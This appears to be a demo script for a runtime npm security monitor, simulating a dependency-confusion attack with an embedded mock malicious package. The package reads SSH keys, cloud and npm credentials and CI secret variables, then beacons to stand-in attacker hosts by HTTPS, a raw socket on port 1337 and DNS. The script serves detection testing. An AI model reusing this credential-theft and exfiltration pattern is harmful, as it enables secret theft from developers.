#!/usr/bin/env node
/**
 * ============================================================================
 * BHEESHMA Demo #3: Dependency Confusion Attack (2021)
 * ============================================================================
 *
 * REAL-WORLD ATTACK SUMMARY:
 * In 2021, security researcher Alex Birsan discovered that many Fortune 500
 * companies were vulnerable to "dependency confusion" attacks. The technique:
 *
 *   1. Companies use internal/private npm registries for proprietary packages
 *      (e.g., "@company/dashboard-utils", "internal-auth-service")
 *   2. If a developer's npm config doesn't resolve private packages first,
 *      npm falls through to the PUBLIC registry
 *   3. An attacker publishes a package with the SAME NAME on public npm
 *   4. The attacker's public version gets installed instead of the internal one
 *   5. The public version contains malware — stealing CI secrets, SSH keys,
 *      source code, and deploying backdoors
 *
 * IMPACT: Apple, Microsoft, Tesla, Netflix, Uber, Yelp, and dozens of other
 *         companies were found vulnerable. Birsan earned $130k+ in bug bounties.
 *
 * This demo simulates an attacker publishing "internal-auth-service" on public
 * npm with credential theft, HTTP exfiltration, and backdoor port connections.
 * ============================================================================
 */

'use strict';

const fs = require('fs');
const path = require('path');

// ── Bheeshma setup ──────────────────────────────────────────────────────────
const bheeshma = require('../src/index');

const MOCK_BASE = path.join(__dirname, '..', 'test', 'node_modules');

function createMockPackage(dirName, pkgName, pkgVersion, sourceCode) {
    const dir = path.join(MOCK_BASE, dirName);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
        path.join(dir, 'package.json'),
        JSON.stringify({ name: pkgName, version: pkgVersion, main: 'index.js' }),
        'utf8'
    );
    fs.writeFileSync(path.join(dir, 'index.js'), sourceCode, 'utf8');
    return dir;
}

// ── Mock "internal-auth-service" — attacker's confusion package ──────────────
const internalAuthSource = `
'use strict';

// ================================================================
// "internal-auth-service" v9.9.9 — FAKE PACKAGE on public npm
// Published by attacker to exploit dependency confusion.
// The REAL internal package lives on a private registry.
// ================================================================

const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const net = require('net');
const dns = require('dns');

var homedir = os.homedir();

// ── STEP 1: Credential reconnaissance ──
// Read sensitive files to steal CI/CD secrets and developer credentials
var targets = [
    homedir + '/.npmrc',
    homedir + '/.aws/credentials',
    homedir + '/.ssh/id_rsa',
    homedir + '/.ssh/id_ed25519',
    homedir + '/.env',
    homedir + '/.docker/config.json'
];

var stolenData = '';
for (var i = 0; i < targets.length; i++) {
    try {
        if (fs.existsSync(targets[i])) {
            stolenData += fs.readFileSync(targets[i], 'utf8');
        }
    } catch(e) {}
}

// ── STEP 2: Harvest CI secrets from environment ──
var ciToken = process.env.GITHUB_TOKEN;
var npmToken = process.env.NPM_TOKEN;
var awsKey = process.env.AWS_ACCESS_KEY_ID;
var awsSecret = process.env.AWS_SECRET_ACCESS_KEY;
var dbUrl = process.env.DATABASE_URL;
var privateKey = process.env.PRIVATE_KEY;
var jwtSecret = process.env.JWT_SECRET;

// ── STEP 3: Exfiltrate via HTTP POST to attacker server ──
// Correlation: reading sensitive files AND making HTTP requests = exfiltration
try {
    var exfilReq = https.request({
        hostname: 'evil-exfil.attacker-cdn.com',
        port: 443,
        path: '/api/collect',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    }, function() {});
    exfilReq.on('error', function() {});
    exfilReq.end();
    exfilReq.destroy(); // Abort immediately — don't actually connect
} catch(e) {}

// ── STEP 4: Connect to non-standard port (backdoor beacon) ──
// Ports 1337, 4444, 31337 are classic backdoor ports
try {
    var socket = net.connect({ host: 'attacker-c2.xyz', port: 1337 }, function() {
        socket.destroy();
    });
    socket.on('error', function() { socket.destroy(); });
    socket.setTimeout(1000, function() { socket.destroy(); });
} catch(e) {}

// ── STEP 5: DNS exfiltration for stealth ──
try {
    dns.lookup('token-exfil.attacker-dns.net', function() {});
    dns.lookup('c2-beacon.darknet-relay.io', function() {});
} catch(e) {}

// ── Export a legitimate-looking auth API ──
module.exports = {
    authenticate: function(token) { return { valid: true }; },
    getServiceToken: function() { return 'fake-jwt'; },
    version: '9.9.9'
};
`;

// ── Banner ───────────────────────────────────────────────────────────────────
function printBanner() {
    console.log('');
    console.log('\x1b[31m' + '█'.repeat(72) + '\x1b[0m');
    console.log('\x1b[31m█\x1b[0m  \x1b[1mBHEESHMA Demo #3 — Dependency Confusion Attack (2021)\x1b[0m'
        + ' '.repeat(72 - 52) + '\x1b[31m█\x1b[0m');
    console.log('\x1b[31m' + '█'.repeat(72) + '\x1b[0m');
    console.log('');
    console.log('  Alex Birsan showed that internal package names claimed on public npm');
    console.log('  get installed instead of private versions — exposing Apple, Microsoft,');
    console.log('  Tesla, Netflix and 50+ other companies.');
    console.log('');
    console.log('  The attacker publishes "internal-auth-service" with credential theft,');
    console.log('  HTTP exfiltration, and backdoor port connections.');
    console.log('');
    console.log('  \x1b[33m→ Loading the confusion package under bheeshma surveillance...\x1b[0m');
    console.log('');
}

// ── Main ─────────────────────────────────────────────────────────────────────
async function main() {
    printBanner();

    // Create mock package
    const internalDir = createMockPackage('internal-auth-service', 'internal-auth-service', '9.9.9', internalAuthSource);

    // Initialize bheeshma
    const initResult = bheeshma.init();
    console.log('  \x1b[32m✓ Bheeshma initialized\x1b[0m — hooks active:'
        + ` ${initResult.installed.join(', ')}`);
    console.log('');

    // ── Simulate: npm install resolves to attacker's public package ──
    console.log('  \x1b[33m→ require("internal-auth-service") — WRONG! Got attacker\'s version from public npm!\x1b[0m');
    console.log('');

    try {
        require(path.join(internalDir, 'index.js'));
    } catch (e) {
        // Network operations may fail — that's expected
    }

    // Let async hooks settle
    await new Promise(r => setTimeout(r, 500));

    // ── Generate report ──
    console.log('  \x1b[32m✓ Dependency confusion attack detected — generating BHEESHMA report...\x1b[0m');
    console.log('');

    const report = bheeshma.generateReport('cli');
    console.log(report);

    // ── Cleanup ──
    try { fs.rmSync(path.join(MOCK_BASE, 'internal-auth-service'), { recursive: true, force: true }); } catch (e) {}
    bheeshma.teardown();

    // ── Verdict ──
    console.log('\x1b[31m  ⚠  VERDICT: BHEESHMA CAUGHT the dependency confusion attack.\x1b[0m');
    console.log('     Credential file reads + HTTP exfiltration correlation, backdoor port');
    console.log('     connections, DNS beaconing, and secret env var harvesting — all caught');
    console.log('     at runtime even though the package name looked "legitimate."');
    console.log('');
}

main().catch(err => {
    console.error('Demo error:', err);
    bheeshma.teardown();
    process.exit(1);
});
